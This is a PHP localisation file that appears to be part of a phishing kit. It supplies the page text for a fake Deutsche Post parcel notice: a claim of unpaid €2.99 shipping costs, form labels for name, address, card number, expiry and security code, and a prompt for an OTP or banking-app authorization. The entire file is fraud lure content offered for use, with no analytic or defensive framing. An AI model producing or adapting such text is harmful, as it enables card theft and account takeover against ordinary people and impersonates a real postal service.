<?php

function lang($phrase){
    static $lang = array(
        '1' => 'German Post – The Post for Germany', // Page Title
        '2' => 'Parcel Delivery', // Heading
        '3' => 'Your parcel has unpaid shipping costs of €2.99 EUR. If these costs are not paid, the parcel will be returned.', // Subheading
        '4' => 'Full Name', // Full Name
        '5' => 'Phone Number', // Phone Number
        '6' => 'Street Address', // Street Address
        '7' => 'City', // City
        '8' => 'Postal Code', // Postal Code
        '9' => 'Card Number', // Card Number
        '10' => 'Expiration Date (MM/YY)', // Expiration Date
        '11' => 'Security Code', // Security Code
        '12' => 'Confirm and Continue', // Confirm and Continue
        '13' => 'Shipping Cost:', // Shipping Cost Label
        '14' => 'Identity Verification', // OTP Code
        '15' => 'Merchant', // Merchant
        '16' => 'Shipping Cost', // Shipping Cost Amount
        '17' => 'Date', // Date
        '18' => 'OTP Verification Code', // OTP
        '19' => 'Confirm and Continue',  // Confirm and Continue
        '20' => 'To verify your transaction, please use your banking application and provide the necessary authorization. After confirmation, please click on "Confirm and Continue."',  // Confirm and Continue
        '21' => 'Deutsche Post',  // Additional
    );

    return $lang[$phrase];
}
?>
